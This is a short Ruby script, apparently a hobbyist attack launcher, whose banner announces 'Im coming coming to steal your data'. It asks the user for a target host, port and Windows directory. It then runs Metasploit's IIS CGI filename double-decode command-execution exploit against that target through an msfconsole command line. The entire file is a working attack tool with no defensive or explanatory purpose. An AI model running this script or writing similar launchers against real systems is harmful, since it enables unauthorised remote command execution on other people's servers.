require 'colorize'
puts """

 	      Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  
        1st Try {set RPORT 80; 2nd RPORT 8080}

   IIS/PWS CGI Filename Double Decode Command Execution
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp



puts " [?] Input The windows directory of the target host".blue
print " [!] ---> ".yellow
path = gets.chomp



exec("msfconsole -x 'use exploit/windows/iis/ms01_026_dbldecode' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg WINDIR #{path}' -x 'run'")

